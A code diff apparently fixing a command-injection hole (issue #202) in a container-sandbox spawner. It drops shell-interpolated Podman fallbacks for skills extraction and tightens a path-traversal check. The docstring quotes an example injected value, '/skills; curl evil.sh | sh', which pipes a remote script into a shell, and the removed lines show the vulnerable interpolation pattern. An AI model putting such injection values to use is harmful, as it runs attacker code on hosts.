@@ -260,7 +260,6 @@ class OpenShellSpawner(AgentSpawner):
         self._extra_env = self._validate_extra_env(
             extra_env if extra_env is not None else dict(self._DEFAULT_EXTRA_ENV)
         )
-        self._podman_cli: str | None = None
         self._sandbox_names: dict[str, str] = {}
         self._sandbox_ids: dict[str, str] = {}
         self._virtual_hosts: dict[str, str] = {}
@@ -998,14 +997,8 @@ class OpenShellSpawner(AgentSpawner):
     ) -> None:
         """Load skills from an OCI image into the sandbox.
 
-        Extracts skills content from the image locally, then streams
-        it into the sandbox via exec_stream with tar.
-
-        Cross-platform: uses the Podman Python SDK (available in the
-        runner container) to run a transient container that copies
-        skills into a temp dir. Falls back to podman CLI if the SDK
-        is not available. The sandbox-side tar upload is the same
-        regardless of extraction method.
+        Extracts skills content from the image locally via crane, then
+        streams it into the sandbox via exec_stream with tar.
         """
         import shutil
         import tarfile
@@ -1049,116 +1042,74 @@ class OpenShellSpawner(AgentSpawner):
         copy_paths: list[str],
         tmp_dir: str,
     ) -> None:
-        """Extract skills content from an OCI image to a local directory.
+        """Extract skills content from an OCI image to a local directory via crane.
 
-        Fallback chain (first success wins):
-        1. crane — static binary, no daemon needed, works everywhere
-        2. Podman Python SDK — needs Podman socket
-        3. podman CLI — needs binary + socket
+        crane is a static binary with no daemon dependency -- works in any
+        environment (K8s pods, bare runners) without needing a Podman
+        socket. Install it in the runner Containerfile from
+        go-containerregistry releases.
 
-        crane is the primary path because it works in K8s pods
-        where no container runtime socket is available. Install it
-        in the runner Containerfile from go-containerregistry releases.
+        No fallback: a Podman SDK/CLI fallback previously existed here,
+        but both built the extraction container's copy command via shell
+        string interpolation of caller-supplied `copy_paths`
+        (`sh -c " && ".join(f"cp -r {p} ..." ...)`), letting a value like
+        "/skills; curl evil.sh | sh" execute arbitrary commands (issue
+        #202). crane never invokes a shell -- skills_image is passed as a
+        single argv element to `crane export` -- so removing the fallback
+        chain closes that surface entirely rather than leaving a
+        less-safe extraction method one exception away from being used.
+        If crane is missing or extraction fails, this raises.
+
+        Raises:
+            RuntimeError: If the crane binary isn't found, or `crane
+                export` fails.
         """
         import shutil
         import subprocess
+        import tarfile
+        from io import BytesIO
 
-        # 1. Try crane (no daemon needed — works in K8s pods)
         crane_bin = shutil.which("crane")
-        if crane_bin:
-            try:
-
-                def _crane_extract() -> None:
-                    result = subprocess.run(
-                        [crane_bin, "export", skills_image, "-"],
-                        capture_output=True,
-                        timeout=120,
-                    )
-                    if result.returncode != 0:
-                        raise RuntimeError(f"crane export failed: {result.stderr.decode()[:200]}")
-                    import tarfile
-                    from io import BytesIO
-
-                    with tarfile.open(fileobj=BytesIO(result.stdout)) as tar:
-                        for member in tar:
-                            if member.issym() or member.islnk():
-                                continue
-                            for skill_path in copy_paths:
-                                prefix = skill_path.lstrip("/") + "/"
-                                if member.name.startswith(prefix):
-                                    member.name = member.name[len(prefix) :]
-                                    resolved = os.path.normpath(
-                                        os.path.join(tmp_dir, member.name),
-                                    )
-                                    if not resolved.startswith(tmp_dir):
-                                        continue
-                                    tar.extract(member, tmp_dir)
-
-                await asyncio.to_thread(_crane_extract)
-                logger.info("Extracted skills via crane from '%s'", skills_image)
-                return
-            except Exception:
-                logger.warning(
-                    "crane skills extraction failed, trying Podman SDK",
-                    exc_info=True,
-                )
-
-        # 2. Try Podman Python SDK (needs socket)
-        try:
-            from podman import PodmanClient
-
-            def _sdk_extract() -> None:
-                pclient = PodmanClient(
-                    base_url=f"unix://{os.environ.get('CONTAINER_HOST', '/run/podman/podman.sock').replace('unix://', '')}",
-                )
-                copy_cmd = " && ".join(f"cp -r {p}/* /out/ 2>/dev/null || true" for p in copy_paths)
-                pclient.containers.run(
-                    skills_image,
-                    command=["sh", "-c", copy_cmd],
-                    volumes={tmp_dir: {"bind": "/out", "mode": "rw"}},
-                    remove=True,
-                    detach=False,
-                )
-                pclient.close()
-
-            await asyncio.to_thread(_sdk_extract)
-            logger.info("Extracted skills via Podman SDK from '%s'", skills_image)
-            return
-        except ImportError:
-            pass
-        except Exception:
-            logger.warning(
-                "Podman SDK skills extraction failed, trying CLI",
-                exc_info=True,
+        if not crane_bin:
+            raise RuntimeError(
+                f"Cannot extract skills image '{skills_image}': crane binary not found. "
+                "Install crane in the runner image (see deploy/workflow-runner/Containerfile)."
             )
 
-        # 3. Try podman CLI
-        if self._podman_cli:
-            for src_path in copy_paths:
-                await asyncio.to_thread(
-                    subprocess.run,
-                    [
-                        self._podman_cli,
-                        "run",
-                        "--rm",
-                        "-v",
-                        f"{tmp_dir}:/out:Z",
-                        skills_image,
-                        "sh",
-                        "-c",
-                        f"cp -r {src_path}/* /out/ 2>/dev/null || true",
-                    ],
-                    check=True,
-                    capture_output=True,
-                    timeout=120,
-                )
-            logger.info("Extracted skills via podman CLI from '%s'", skills_image)
-            return
+        def _crane_extract() -> None:
+            result = subprocess.run(
+                [crane_bin, "export", skills_image, "-"],
+                capture_output=True,
+                timeout=120,
+            )
+            if result.returncode != 0:
+                raise RuntimeError(f"crane export failed: {result.stderr.decode()[:200]}")
 
-        raise RuntimeError(
-            f"Cannot extract skills image '{skills_image}': "
-            "none of crane, Podman SDK, or podman CLI available"
-        )
+            with tarfile.open(fileobj=BytesIO(result.stdout)) as tar:
+                for member in tar:
+                    if member.issym() or member.islnk():
+                        continue
+                    for skill_path in copy_paths:
+                        prefix = skill_path.lstrip("/") + "/"
+                        if member.name.startswith(prefix):
+                            member.name = member.name[len(prefix) :]
+                            resolved = os.path.normpath(
+                                os.path.join(tmp_dir, member.name),
+                            )
+                            # Require an os.sep boundary (or exact equality),
+                            # not just a string prefix -- resolved.startswith(tmp_dir)
+                            # alone would incorrectly accept a sibling directory
+                            # whose name happens to share tmp_dir as a string
+                            # prefix (e.g. tmp_dir="/tmp/skills-x" matching a
+                            # resolved path under "/tmp/skills-xyz/") (issue #202).
+                            if resolved != tmp_dir and not resolved.startswith(
+                                tmp_dir + os.sep
+                            ):
+                                continue
+                            tar.extract(member, tmp_dir)
+
+        await asyncio.to_thread(_crane_extract)
+        logger.info("Extracted skills via crane from '%s'", skills_image)
 
     async def _inject_mcp_secrets(
         self,
